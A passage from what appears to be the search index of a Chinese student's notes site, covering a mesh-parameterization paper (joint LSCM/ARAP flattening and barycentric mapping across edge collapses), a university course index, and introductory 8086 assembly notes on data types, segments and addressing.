\\(\\mathbf{U}\\_b\\)\u200b\uff0c\u628a\u4e24\u5757\u8865\u4e01\u8fb9\u754c\u9876\u70b9\u7684 UV \u90fd\u5f15\u7528\u540c\u4e00\u4efd\u81ea\u7531\u5ea6\u3002\u8fd9\u6837\uff0c\u539f\u6765\u201c\\(\\mathbf{U}^l_{\\partial} = \\mathbf{U}^{l+1}_{\\partial}\\)\u200b\u201d\u7684\u7b49\u5f0f\u7ea6\u675f\u88ab\u201c\u6d88\u5143\u201d\u6210\u5171\u4eab\u53d8\u91cf\uff0c\u4ece\u800c\u628a\u5e26\u7ea6\u675f\u6700\u5c0f\u5316\u6539\u5199\u4e3a\u65e0\u7ea6\u675f\u6700\u5c0f\u5316\uff1a</li> </ul> \\[\\min_{\\;\\mathbf{U}^l_{\\text{int}},\\;\\mathbf{U}^{l+1}_{\\text{int}},\\;\\mathbf{U}_b} \\;\\; E_{\\text{param}}(P^l;\\;\\mathbf{U}^l_{\\text{int}},\\mathbf{U}_b)\\;+\\; E_{\\text{param}}(P^{l+1};\\;\\mathbf{U}^{l+1}_{\\text{int}},\\mathbf{U}_b).\\] <p>\u76f4\u89c2\u4e0a\uff0c\u4e24\u5757\u8865\u4e01\u5171\u540c\u62c9\u5e73\uff0c\u4f46\u5171\u4eab\u4e00\u6761\u540c\u6837\u7684\u8fb9\u754c\u66f2\u7ebf\u3002</p> <p>\u9009\u54ea\u79cd\u53c2\u6570\u5316\u80fd\u91cf \\(E_{\\text{param}}\\)\u200b\uff1a</p> <ul> <li>\u8bba\u6587\u652f\u6301\u53ef\u63d2\u62d4\u7684\u80fd\u91cf\uff1a\u5982 LSCM\uff08\u6700\u5c0f\u4e8c\u4e58\u5171\u5f62\uff09\u6216 ARAP\uff08\u5c3d\u53ef\u80fd\u521a\u6027\uff09\u3002\u5c0f\u8865\u4e01\u4e0a\u4e24\u8005\u90fd\u5f88\u7a33\u5065\uff1b\u4f5c\u8005\u5c55\u793a\u4e86\u4e24\u8005\u90fd\u53ef\u7528\u3001\u5e76\u6bd4\u8f83\u4e86\u4e0d\u540c\u7ec4\u5408\u5bf9\u591a\u91cd\u7f51\u683c\u6536\u655b\u7684\u5f71\u54cd\u3002\u5b9e\u9a8c\u91cc\u201c\u5747\u5300 decimation + LSCM\u201d\u6536\u655b\u6700\u597d\u3002\u5b9e\u73b0\u4e0a\u4f60\u53ef\u4ee5\u5148\u7528 LSCM\uff08\u7ebf\u6027\u6700\u5c0f\u4e8c\u4e58\u3001\u4e00\u6b21\u6c42\u89e3\uff09\uff0c\u8981\u66f4\u5c0f\u9762\u79ef\u7578\u53d8\u53ef\u7528 ARAP\uff08local\u2013global \u8fed\u4ee3\uff09\u3002</li> </ul> <p>\u89c4\u8303\uff08gauge\uff09\u4e0e\u53ef\u89e3\u6027\uff1a</p> <ul> <li>\u50cf LSCM/ARAP \u8fd9\u7c7b\u80fd\u91cf\u5bf9\u5e73\u79fb/\u65cb\u8f6c/\u5c3a\u5ea6\u5f80\u5f80\u4e0d\u654f\u611f\uff08\u6709\u96f6\u7a7a\u95f4\uff09\u3002\u5b9e\u9645\u4e2d\u8981\u56fa\u5b9a\u89c4\u8303\uff1a\u5e38\u89c1\u505a\u6cd5\u662f\u5728\u5171\u4eab\u8fb9\u754c \\(\\mathbf{U}_b\\)\u200b \u4e0a\u9489\u4f4f\u4e24\u4e2a\u9876\u70b9\uff08\u4f8b\u5982\u8bbe\u4e3a \\((0,0)\\) \u4e0e \\((1,0)\\)\uff09\uff0c\u6216\u7ed9\u51fa\u201c\u53bb\u521a\u4f53\u201d\u7ea6\u675f\u3002\u7531\u4e8e\u6211\u4eec\u6700\u7ec8\u53ea\u7528\u91cd\u5fc3\u5750\u6807\uff0c\u5b83\u5bf9\u76f8\u4f3c\u53d8\u6362\uff08\u65cb\u8f6c/\u7edf\u4e00\u7f29\u653e/\u5e73\u79fb\uff09\u4e0d\u654f\u611f\uff0c\u6240\u4ee5\u4f60\u9489\u54ea\u4e24\u4e2a\u70b9\u90fd\u53ef\u4ee5\uff0c\u53ea\u8981\u4e0d\u7ffb\u8f6c\uff08Jacobian&gt;0\uff09\u5373\u53ef\u3002</li> </ul> <p>\u7b2c\u4e8c\u6b65\uff1a\u8fb9\u754c\u5728\u201c\u8fb9\u754c\u8fb9\u201d\u60c5\u5f62\u7684\u7279\u6b8a\u5904\u7406</p> <p>\u5f53\u8981\u6298\u53e0\u7684 \\((i,j)\\) \u5728\u7f51\u683c\u8fb9\u754c\u4e0a\u65f6\uff0c\u76f4\u63a5\u5171\u4eab\u4e00\u6574\u5708\u8fb9\u754c\u5e76\u4e0d\u603b\u662f\u5145\u5206/\u9002\u7528\u3002\u8bba\u6587\u5bf9\u4e24\u7c7b\u8fb9\u754c\u60c5\u5f62\u4f7f\u7528\u4e86\u201c\u8d34\u8fb9/\u5171\u7ebf\u201d\u7684\u9644\u52a0\u7ea6\u675f\uff0c\u5e76\u5728\u201c\u53cc\u7aef\u90fd\u5728\u8fb9\u754c\u201d\u65f6\u679a\u4e3e\u4e09\u79cd\u53ef\u80fd\u7684\u8054\u5408\u53d8\u91cf\u5206\u7ec4\uff0c\u5206\u522b\u52a0\u5165\u4e0d\u540c\u7684\u5171\u7ebf\uff08colinearity\uff09\u7ea6\u675f\uff0c\u6700\u540e\u9009\u80fd\u91cf\u6700\u5c0f\u7684\u90a3\u79cd\u4f5c\u4e3a\u8054\u5408\u5c55\u5e73\u89e3\uff1a</p> <ul> <li>\u5355\u7aef\u5728\u8fb9\u754c\uff1a\u628a\u53e6\u4e00\u7aef\u5bf9\u5e94\u7684 UV \u4e5f\u201c\u5438\u9644\u201d\u5230\u8fb9\u754c\u7ebf\u4e0a\uff0c\u4fdd\u8bc1\u5171\u4eab\u8fb9\u754c\u66f2\u7ebf\u95ed\u5408\u4e00\u81f4\uff1b</li> <li>\u53cc\u7aef\u5728\u8fb9\u754c\uff1a\u8003\u8651\u4e09\u79cd\u201c\u8c01\u843d\u5728\u54ea\u4e2a\u7aef\u70b9/\u6216\u843d\u5728\u8fd9\u6761\u8fb9\u76f4\u7ebf\u201d\u4e0a\u7684\u5206\u7ec4\u65b9\u6848\uff0c\u5404\u81ea\u5f62\u6210\u4e0d\u540c\u7684\u7ebf\u6027\u7ea6\u675f\uff08\u628a\u6d89\u53ca\u7684\u9876\u70b9\u5728 UV \u4e2d\u5f3a\u5236\u5171\u7ebf\uff09\uff0c\u8ba1\u7b97\u4e09\u6b21\u80fd\u91cf\uff0c\u53d6\u6700\u5c0f\u3002  <ul> <li>\u8fd9\u6837\u65e0\u8bba\u5185\u70b9\u8fb9\u8fd8\u662f\u8fb9\u754c\u8fb9\uff0c\u8054\u5408\u5c55\u5e73\u540e\u7684\u8fb9\u754c\u66f2\u7ebf\u59cb\u7ec8\u4e00\u81f4\uff0c\u4ece\u800c\u4fdd\u6301\u53cc\u5c04\u3002</li> </ul> </li> </ul> <p>\u7b2c\u4e09\u6b65\uff1a\u6c42\u89e3\u8054\u5408\u5c55\u5e73</p> <p>\u4ee5 LSCM \u4e3a\u4f8b\uff08\u63a8\u8350\u6253\u5e95\u5b9e\u73b0\uff09\uff1a</p> <ol> <li>\u4e3a \\(P^l\\) \u548c \\(P^{l+1}\\) \u5206\u522b\u88c5\u914d LSCM \u7684\u7a00\u758f\u6700\u5c0f\u4e8c\u4e58\u77e9\u9635\uff08\u6bcf\u4e2a\u4e09\u89d2\u5f62\u8d21\u732e\u4e00\u7ec4\u8fd1\u4f3c Cauchy\u2013Riemann \u7ebf\u6027\u65b9\u7a0b\uff09\u3002</li> <li>\u628a\u4e24\u8fb9\u7684\u7cfb\u7edf\u5806\u53e0\u5728\u4e00\u8d77\uff0c\u4f46\u5bf9\u8fb9\u754c\u9876\u70b9\u5f15\u7528\u540c\u4e00\u4efd \\(\\mathbf{U}_b\\)\u200b\uff08\u5373\u201c\u53d8\u91cf\u522b\u540d\u201d\uff09\uff1a\u8fd9\u4e00\u6b65\u628a\u201c\u8fb9\u754c\u4e00\u81f4\u201d\u4f5c\u4e3a\u53d8\u91cf\u5c42\u9762\u7684\u5408\u5e76\u800c\u975e\u7ea6\u675f\u3002</li> <li>\u52a0\u4e0a\u89c4\u8303\uff08\u56fa\u5b9a\u4e24\u70b9\u6216\u53bb\u521a\u4f53\uff09\uff0c\u7136\u540e\u4e00\u6b21\u6027\u505a\u6700\u5c0f\u4e8c\u4e58\u6c42\u89e3 \\(\\min\\|A\\mathbf{u}-b\\|^2\\)\u3002LSCM \u7684\u516c\u5f0f\u548c\u88c5\u914d\u7ec6\u8282\u89c1\u539f\u59cb\u8bba\u6587\uff08L\u00e9vy 2002\uff09\u3002ARAP \u7248\u672c\u5219\u662f standard \u7684 local\u2013global\uff1a\u5c40\u90e8\u62df\u5408\u6bcf\u4e2a\u4e09\u89d2\u7684\u6700\u4f73\u521a\u4f53\u53d8\u6362\uff0c\u5168\u7403\u89e3\u4e00\u6b21\uff0c\u4ea4\u66ff\u51e0\u8f6e\u6536\u655b\u5373\u53ef\u3002</li> </ol> <p>\u4e3a\u4ec0\u4e48\u8fd9\u6837\u505a\u80fd\u964d\u4f4e\u7578\u53d8\uff1f \u5982\u679c\u4f60\u5148\u628a \\(P^l\\) \u62c9\u5e73\uff0c\u518d\u628a \\(P^{l+1}\\) \u62c9\u5e73\u5e76\u786c\u6027\u201c\u5bf9\u9f50\u201d\u8fb9\u754c\uff0c\u7b2c\u4e8c\u4e2a\u8865\u4e01\u5e38\u4e3a\u8fce\u5408\u8fb9\u754c\u800c\u201c\u5403\u4e0b\u201d\u66f4\u591a\u7578\u53d8\uff1b\u800c\u8054\u5408\u4f18\u5316\u7b49\u4ef7\u4e8e\u201c\u5728\u8fb9\u754c\u4e00\u81f4\u7684\u524d\u63d0\u4e0b\uff0c\u540c\u65f6\u7ed9\u4e24\u8fb9\u5206\u914d\u5408\u7406\u7684\u5185\u70b9 UV\u201d\uff0c\u4f7f\u603b\u4f53\u7578\u53d8\u6700\u5c0f\u3001\u4e5f\u66f4\u5747\u8861\uff08\u8bba\u6587 Fig.9 \u7684\u7edf\u8ba1\u5c55\u793a\u4e86\u5931\u771f\u66f4\u4f4e\uff09\u3002</p> <p>\u7b2c\u56db\u6b65\uff1a\u7528\u8054\u5408 UV \u4f20\u9012\u91cd\u5fc3\u5750\u6807\uff08\u6838\u5fc3\u5b9e\u73b0\u843d\u5730\uff09</p> <p>\u5047\u8bbe\u6709\u4e00\u70b9 \\(p_l\\in P^l\\)\uff0c\u6211\u4eec\u77e5\u9053\u5b83\u5728\u6298\u53e0\u524d\u7f51\u683c\u67d0\u4e2a\u4e09\u89d2\u5f62 \\(\\triangle v_0v_1v_2\\in F^l\\) \u4e0a\u7684\u91cd\u5fc3\u7cfb\u6570 \\((\\lambda_0,\\lambda_1,\\lambda_2)\\)\uff08\u8fd9\u6b63\u662f\u8bba\u6587\u5b58\u7684\u201c\u70b9\u7528\u91cd\u5fc3\u5750\u6807\u8868\u793a\u201d\u7684\u542b\u4e49\u2014\u2014\u5b83\u5929\u7136\u8de8\u76f8\u4f3c\u53d8\u6362\u7a33\u5b9a\uff09\u3002\u5982\u4f55\u628a\u5b83\u6620\u5c04\u5230\u6298\u53e0\u540e \\(P^{l+1}\\)\uff1f</p> <p>\u6b65\u9aa4 A\uff1a\u628a \\(p_l\\)\u200b \u9001\u5230\u5171\u4eab UV</p> <ol> <li>\u53d6\u8be5\u4e09\u89d2\u5f62\u4e09\u4e2a\u9876\u70b9\u5728\u6298\u53e0\u524d\u8865\u4e01\u7684 UV\uff1a\\(\\mathbf{u}_0,\\mathbf{u}_1,\\mathbf{u}_2\\in\\mathbb{R}^2\\)\uff08\u6765\u81ea\u4e0a\u9762\u8054\u5408\u6c42\u89e3\u7684 \\(\\mathbf{U}^l\\)\uff09\u3002</li> <li>\u7ebf\u6027\u63d2\u503c\u5f97\u5230 \\(p\\) \u5728 UV \u5e73\u9762\u7684\u5750\u6807\uff1a</li> </ol> \\[\\mathbf{u}_p=\\lambda_0\\mathbf{u}_0+\\lambda_1\\mathbf{u}_1+\\lambda_2\\mathbf{u}_2.\\] <p>\u6b65\u9aa4 B\uff1a\u4ece\u5171\u4eab UV \u56de\u5230\u6298\u53e0\u540e\u8865\u4e01</p> <ol> <li> <p>\u5728\u6298\u53e0\u540e\u8865\u4e01\u7684\u4e09\u89d2\u7f51 (\\(V^{l+1},F^{l+1}\\)) \u7684 UV\uff08\\(\\mathbf{U}^{l+1}\\)\uff09\u91cc\uff0c\u5b9a\u4f4d \\(\\mathbf{u}_p\\)\u200b \u843d\u5728\u54ea\u4e2a\u4e09\u89d2\u5f62 \\(\\triangle w_0w_1w_2\u200b\\) \u7684 UV \u4e09\u89d2 \\((\\mathbf{u}'_0,\\mathbf{u}'_1,\\mathbf{u}'_2)\\) \u5185\uff08\u5e38\u89c4\u70b9-\u5728-\u4e09\u89d2\u5f62\u6d4b\u8bd5\uff09\u3002</p> </li> <li> <p>\u89e3\u4e00\u4e2a 2\u00d72 \u7ebf\u6027\u7cfb\u7edf\u5f97\u5230\u5176\u5728\u8be5\u4e09\u89d2\u5f62\u7684\u91cd\u5fc3\u5750\u6807 \\((\\mu_0,\\mu_1,\\mu_2)\\)\uff1a</p> </li> </ol> \\[\\begin{aligned} \\mathbf{v}_0 &amp;= \\mathbf{u}'_1-\\mathbf{u}'_0,\\quad \\mathbf{v}_1 = \\mathbf{u}'_2-\\mathbf{u}'_0,\\quad \\mathbf{v} = \\mathbf{u}_p-\\mathbf{u}'_0,\\\\ \\begin{bmatrix}\\mathbf{v}_0 &amp; \\mathbf{v}_1\\end{bmatrix} \\begin{bmatrix}\\mu_1\\\\ \\mu_2\\end{bmatrix} &amp;= \\mathbf{v},\\quad \\mu_0 = 1-\\mu_1-\\mu_2. \\end{aligned}\\] <ol> <li>\u8fd9\u7ec4 \\((\\mu_0,\\mu_1,\\mu\\_2)\\) \u5c31\u662f \\(p_{l+1}\\) \u5728\u6298\u53e0\u540e\u7f51\u683c\u4e09\u89d2\u5f62 \\(\\triangle w_0w_1w_2\u200b\\) \u4e0a\u7684\u91cd\u5fc3\u5750\u6807\u3002\u5b8c\u6210 \\(p_l\\mapsto p_{l+1}\\)\u3002\u53cd\u5411\u6620\u5c04\u540c\u7406\u3002</li> </ol> <p>\u7b2c\u4e94\u6b65\uff1a\u628a\u201c\u5355\u6b21\u6298\u53e0\u6620\u5c04\u201d\u4e32\u8d77\u6765</p> <p>\u6574\u5f20\u7f51\u7684\u7ec6\u2194\u7c97\u6620\u5c04\u5c31\u662f\u628a\u6bcf\u6b21\u6298\u53e0\u7684\u4e00\u73af\u6620\u5c04\u6309\u53d1\u751f\u987a\u5e8f\u590d\u5408\u8d77\u6765\u3002\u5b9e\u73b0\u4e0a\uff0c\u4f5c\u8005\u5728\u9884\u5904\u7406\u9636\u6bb5\u4e3a\u6bcf\u6b21\u6298\u53e0\u5b58\u4e0b\u8054\u5408 UV\u4e0e\u6d89\u53ca\u7684\u9762\u7d22\u5f15\uff1b\u67e5\u8be2\u65f6\uff08\u628a\u4efb\u610f\u70b9\u4ece\u7ec6\u5c42\u63a8\u8fdb\u5230\u66f4\u7c97\u5c42\u6216\u53cd\u8fc7\u6765\uff09\u5c31\u987a\u5e8f\u5957\u7528\u4e0a\u9762\u7684\u201cUV \u4e2d\u8f6c + \u91cd\u5fc3\u5750\u6807\u66f4\u65b0\u201d\u3002\u8fd9\u662f\u8bba\u6587\u201cSuccessive self-parameterization\u201d\u7684\u4f7f\u7528\u65b9\u5f0f\u3002</p>"},{"location":"Accumulation/paper/speedup_3/#prolongation-operator","title":"Prolongation Operator","text":"<p>\\(P\\in \\mathbb R^{N_f\\times N_c}\\)\uff0c\u77e9\u9635\u4e2d\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u4e00\u4e2a 3-vector\uff0c\u5373 fine vertex \u5728 coarse triangle \u4e2d\u7684\u91cd\u5fc3\u5750\u6807\u3002</p> <p>\u5b9e\u9645\u5b9e\u73b0\u4e2d\uff0c\u53ef\u4ee5\u5c06 \\(P\\) \u5f62\u72b6\u8bbe\u7f6e\u4e3a \\(\\mathbb R^{3N_f \\times 3N_c}\\) \u7684\u7a00\u758f\u77e9\u9635\uff0c\u4ee5\u9002\u5e94 \\(3N_f\\) \u957f\u5ea6\u7684 gradient \u548c hessian</p>"},{"location":"Courses/","title":"Index","text":"<p> \u7ea6 168 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Courses/#_1","title":"\u5199\u5728\u524d\u9762","text":"<p>\u6d59\u6c5f\u5927\u5b66\u76f8\u5173\u8bfe\u7a0b\u7b14\u8bb0\u3002</p> \u6570\u7406\u57fa\u7840          <ul> <li> \u5fae\u79ef\u5206\u7532II  4768  24 mins              1750819866 </li> <li> \u6982\u7387\u8bba\u4e0e\u6570\u7406\u7edf\u8ba1  18737  93 mins              1750471034 </li> <li> \u79bb\u6563\u6570\u5b66  12209  28  61 mins              1759400069 </li> <li> \u5927\u5b66\u7269\u7406\u4e59  20780  104 mins              1750471034 </li> <li> \u8ba1\u7b97\u7406\u8bba  10402  5  51 mins              1766330536 </li> </ul> \u6570\u636e\u7ed3\u6784\u3001\u7b97\u6cd5\u3001\u5e94\u7528          <ul> <li> \u6570\u636e\u7ed3\u6784\u57fa\u7840  6616  624  41 mins              1750819866 </li> <li> \u9ad8\u7ea7\u6570\u636e\u7ed3\u6784\u4e0e\u7b97\u6cd5  26288  569  139 mins              1742706994 </li> <li> \u6570\u636e\u5e93\u7cfb\u7edf  21642  266  111 mins              1749912212 </li> <li> \u8ba1\u7b97\u673a\u7f51\u7edc  19607  98 mins              1766311303 </li> <li> CTF  14424  272  75 mins              1750471034 </li> <li> \u533a\u5757\u94fe\u6280\u672f\u5e94\u7528\u5b9e\u8df5  4921  25 mins              1759400069 </li> </ul> \u8ba1\u7b97\u673a\u7cfb\u7edf          <ul> <li> \u6570\u5b57\u903b\u8f91\u8bbe\u8ba1  13309  367  72 mins              1750471034 </li> <li> \u8ba1\u7b97\u673a\u7ec4\u6210  15329  367  82 mins              1750254968 </li> <li> \u8ba1\u7b97\u673a\u4f53\u7cfb\u7ed3\u6784  16548  149  84 mins              1750254968 </li> <li> \u64cd\u4f5c\u7cfb\u7edf  21678  283  112 mins              1766132171 </li> <li> \u6c47\u7f16\u4e0e\u63a5\u53e3  15944  351  84 mins              1766231816 </li> </ul> \u8bed\u8a00          <ul> <li> x86\u6c47\u7f16\u8bed\u8a00  9911  484  55 mins              1762139484 </li> <li> CS106L / OOP  9001  1561  65 mins              1750819866 </li> </ul>"},{"location":"Courses/8086asm/","title":"8086 \u6c47\u7f16\u8bed\u8a00","text":""},{"location":"Courses/8086asm/#8086","title":"8086 \u6c47\u7f16\u8bed\u8a00","text":"<p> \u7ea6 234 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"Courses/8086asm/#_1","title":"\u6742\u9879","text":"<p>\u867d\u7136\u4e4b\u524d\u542c\u8bf4\u8fc7bhh\u7684\u6c47\u7f16\u5f88\u96be\uff0c\u4f46\u662f\u8fd9\u95e8\u901a\u8bc6\u6c47\u7f16\u6211\u611f\u89c9\u8fd8\u662f\u5f88\u7b80\u5355\u7684\uff0c\u9009\u5c31\u5bf9\u4e86\uff01</p> <p>\u4e2d\u65ad\u6307\u4ee4\u5927\u5168\uff1a Ralf Brown's Interrupt List</p> <pre><code>tasm test.asm    ; masm test;\n\ntlink test.asm   ; link test;\n\ntd test.asm      ; \n</code></pre> <p>\u4f7f\u7528 <code>command</code> \u6253\u5f00 Dos\uff0c\u4e0d\u8fc7\u4e0d\u7528 Dos \u4e5f\u65e0\u6240\u8c13\u5c31\u662f\u4e86\u3002\uff08\u795e\u5fc5windows\u66f4\u65b0\u8fd8\u4e13\u95e8ban\u4e8616bit\u7a0b\u5e8f\uff0c\u641e\u6bdb\u5462\uff09</p> <p>MS-DOS Player for Win32-x64 \u8b0eWIP\u30da\u30fc\u30b8</p> <p>\u4e00\u822c\u7a0b\u5e8f\u5982\u4f55\u5bfb\u627e main \u51fd\u6570\u7684\u5165\u53e3\uff1f</p> <p>\u770b\u89c1\u4e09\u4e2a\u8fde\u7eed\u7684 <code>push</code>\uff0c\u4e00\u4e2a <code>call</code> \uff0c\u90a3\u4e48 <code>call</code> \u7684\u5730\u5740\u5c31\u662f main \u7684\u5165\u53e3</p> <p><code>0Dh</code> \u4ee3\u8868\u56de\u8f66(\\r)\uff0c\u8868\u793a\u56de\u5230\u884c\u9996\uff1b<code>0Ah</code> \u4ee3\u8868\u6362\u884c(\\n)\uff0c\u8868\u793a\u5782\u76f4\u5411\u4e0b\u6362\u884c\u3002\u6240\u4ee5\u5728 Windows \u7cfb\u7edf\u4e2d\u4e8c\u8005\u4e00\u8d77\u51fa\u73b0\u3002</p> <p>C\u8bed\u8a00\u7684 <code>fgetc()</code> \u51fd\u6570\u8bfb\u53d6\u6587\u4ef6\u65f6\u6bcf\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\uff0c\u4f46\u662f\u5f53\u8bfb\u5230 <code>0Dh</code> \u65f6\uff0c\u4f1a\u81ea\u52a8\u628a\u540e\u9762\u7684 <code>0Ah</code> \u4e00\u8d77\u8bfb\u53d6\u5408\u5e76\u6210 <code>0Ah</code> \uff08\u9664\u975e\u662f rb \u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\uff09</p>"},{"location":"Courses/8086asm/#reference","title":"Reference","text":"<ul> <li>TonyCrane</li> </ul>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/","title":"CPU\u3001\u5185\u5b58\u548c\u7aef\u53e3","text":"<p> \u7ea6 3277 \u4e2a\u5b57  145 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 18 \u5206\u949f</p>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_1","title":"\u6570\u636e\u7684\u8868\u793a\u65b9\u5f0f","text":"<p>\u6c47\u7f16\u8bed\u8a00\u4f7f\u7528\u5173\u952e\u8bcd db (Define Byte) \u6765\u5b9a\u4e49\u5b57\u8282\u7c7b\u578b\u7684\u53d8\u91cf\uff0c\u5c55\u5f00\u6765\u8bb2\u5373\uff1a</p> \u5173\u952e\u8bcd \u4f4d\u6570 \u7b26\u53f7 \u53d8\u91cf db 8 byte <code>char</code> dw 16 word <code>short int</code> dd 32 double word <code>long int</code> \u6216 <code>float</code> dq 64 quadruple word <code>__int64</code> , <code>long long</code> (\u5341\u8fdb\u5236 <code>%lld</code> , \u5341\u516d\u8fdb\u5236 <code>%llx</code>) \u6216 <code>double</code> dt 80 ten bytes <code>long double</code> \uff08<code>%Lf</code>\uff09 <p>1 word \u7684\u4f4d\u6570\u8868\u793a\u4e00\u4e2a\u7cfb\u7edf\u5355\u6b65\u80fd\u5904\u7406\u7684\u6700\u5927\u4f4d\u6570</p> <p>\u90a3\u4e48\u53d8\u91cf\u5b9a\u4e49\u7684\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>\u53d8\u91cf\u540d db|dw|dd|dq|dt \u521d\u59cb\u503c\n</code></pre> <p>\u5f53\u6211\u4eec\u9700\u8981\u591a\u4e2a\u76f8\u540c\u7684\u521d\u59cb\u503c\u65f6\uff0c\u53ef\u4ee5\u4f7f\u7528 DUP \u8fd0\u7b97\u7b26\uff1a</p> <pre><code>xyz dw 1000h dup(55AAh) ; \u51711000h\u4e2a\u5143\u7d20\uff0c\u6bcf\u4e2a\u5143\u7d20\u503c\u90fd\u521d\u59cb\u5316\u4e3a55AAh\nx db 3 dup(1,2) ; \u51716\u4e2a\u5143\u7d20\uff0c\u5206\u522b\u4e3a 1\uff0c2\uff0c1\uff0c2\uff0c1\uff0c2\ny db 2 dup('A',3 dup('B'), 'C') ; y = \"ABBBCABBBC\"\n</code></pre>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_2","title":"\u5185\u5b58","text":"<p>\u5185\u5b58\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\u5206\u914d\u5730\u5740\uff0cDOS\u7cfb\u7edf\u8fd0\u884c\u5728 CPU \u7684\u5b9e\u6a21\u5f0f\u4e0b\uff0c\u53ef\u8bbf\u95ee\u7684\u5730\u5740\u8303\u56f4\u4e3a <code>[00000h,0FFFFFh]</code> \uff0c\u5373\u6700\u591a\u53ea\u80fd\u8bbf\u95ee 1MB \u5185\u5b58\u7a7a\u95f4</p> <p>\u6211\u4eec\u5c06\u5f62\u5982 <code>0FFFFFh</code> \u7684\u5355\u4e2a\u6570\u503c\u8868\u793a\u7684\u5730\u5740\u79f0\u4f5c\u7269\u7406\u5730\u5740\u3002\u7531\u4e8e 8086 \u6bcf\u4e2a\u5bc4\u5b58\u5668\u90fd\u5747\u4e3a 16 \u4f4d\u5bbd\u5ea6\uff0c\u6ca1\u6709\u4e00\u4e2a\u5bc4\u5b58\u5668\u80fd\u5bb9\u7eb3\u4e00\u4e2a 20 \u4f4d\u7684\u7269\u7406\u5730\u5740\uff0c\u4e3a\u6b64 Intel \u516c\u53f8\u8bbe\u8ba1 8086 \u65f6\u5b9a\u4e49\u4e86 4 \u4e2a\u6bb5\u5730\u5740\u5bc4\u5b58\u5668\u548c 4 \u4e2a\u504f\u79fb\u5730\u5740\u5bc4\u5b58\u5668\uff0c\u4ee5\u4fbf\u7528\u903b\u8f91\u5730\u5740\u5f62\u5f0f\u5373 <code>Seg:Offset</code> \u7ec4\u5408\u6765\u95f4\u63a5\u8bbf\u95ee\u7269\u7406\u5730\u5740\u3002</p> <p>\u6bb5\u5730\u5740\u548c\u504f\u79fb\u5730\u5740\u4e24\u4e2a\u6982\u5ff5\u90fd\u548c\u6bb5\uff08segment\uff09\u6709\u5173\uff1a</p> <ul> <li>\u504f\u79fb\u5730\u5740\u6307\u6bb5\u5185\u67d0\u4e2a\u53d8\u91cf\u6216\u6807\u53f7\u4e0e\u6bb5\u9996\u4e4b\u95f4\u7684\u8ddd\u79bb</li> <li>\u6bb5\u5730\u5740\u662f\u6307 20 \u4f4d\u6bb5\u9996\u5730\u5740\u7684\u9ad8 16 \u4f4d</li> </ul> <p>\u6bb5 Segment</p> <p>\u6bb5\u662f\u7b26\u5408\u4ee5\u4e0b\u4e24\u4e2a\u6761\u4ef6\u7684\u4e00\u5757\u5185\u5b58\u7a7a\u95f4\uff1a</p> <ul> <li>\u5185\u5b58\u5757\u7684\u957f\u5ea6\u4f4d 10000h \u5b57\u8282\uff0c\u5373 64KB</li> <li>\u5185\u5b58\u5757\u7684 20 \u4f4d\u9996\u5730\u5740\u7684\u4f4e 4 \u4f4d\u5fc5\u987b\u7b49\u4e8e 0</li> </ul> <p>\u4f8b\u5982\uff0c\u5bf9\u4e8e\u6bb5 <code>[12340h,2233Fh]</code> \uff0c\u5176\u6bb5\u5730\u5740\u4e3a <code>1234h</code></p>"},{"location":"Courses/8086asm/CPU%E3%80%81%E5%86%85%E5%AD%98%E5%92%8C%E7%AB%AF%E5%8F%A3/#_3","title":"\u903b\u8f91\u5730\u5740","text":"<p>\u5728 8086 \u4e2d\uff0c\u903b\u8f91\u5730\u5740\u7531 <code>16bit Seg:16bit Offset</code> \u6784\u6210\uff0c\u53ef\u4ee5\u6839\u636e\u5982\u4e0b\u516c\u5f0f\u5c06\u5176\u8f6c\u6362\u6210\u7269\u7406\u5730\u5740\uff1a</p> \\[ \\text{phy addr} = \\text{Seg} \\times 10h + \\text{Offset} \\] <p>\u5728\u6c47\u7f16\u8bed\u8a00\u7a0b\u5e8f\u4e2d\uff0c\u5982\u679c\u8981\u8bbf\u95ee\u903b\u8f91\u5730\u5740 <code>1234h:5678h</code> (\u7269\u7406\u5730\u5740 <code>179B8h</code>) \u6307\u5411\u7684\u5b57\u8282\u5e76\u8d4b\u503c\u7ed9\u5bc4\u5b58\u5668 AL\uff0c\u53ef\u4ee5\u8fd9\u6837\u5199\uff1a</p> <pre><code>mov ax, 1234h\nmov ds, ax ; \u4ee5 s \u7ed3\u5c3e\u7684\u5bc4\u5b58\u5668\u4e0d\u80fd\u63a5\u53d7\u5e38\u6570\u7ed9\u5b83\u8d4b\u503c\nmov al, ds:[5678h] ; \u6bb5\u5730\u5740\u53ea\u80fd\u7528\u6bb5\u5bc4\u5b58\u5668\u8868\u793a\uff0c1234h:[5678h] \u662f\u9519\u8bef\u7684\u5199\u6cd5\n</code></pre> <ul> <li>\u7528 <code>offset \u53d8\u91cf\u540d\u6216\u6807\u53f7\u540d</code> \u5f15\u7528\u53d8\u91cf\u6216\u6807\u53f7\u7684\u504f\u79fb\u5730\u5740</li> <li>\u7528 <code>seg \u53d8\u91cf\u540d\u6216\u6807\u53f7\u540d\u6216\u6bb5\u540d</code> \u5f15\u7528\u6bb5\u5730\u5740</li> </ul> <p>\u5728\u5f15\u7528\u53d8\u91cf\u6216\u6570\u7ec4\u5143\u7d20\u65f6\uff0c\u82e5\u7528\u5e38\u6570\u8868\u793a\u5b83\u4eec\u7684\u504f\u79fb\u5730\u5740\uff0c\u79f0\u8fd9\u79cd\u5bfb\u5740\u65b9\u5f0f\u4e3a\u76f4\u63a5\u5bfb\u5740\uff0c\u5982 <code>ds:[5678h]</code> 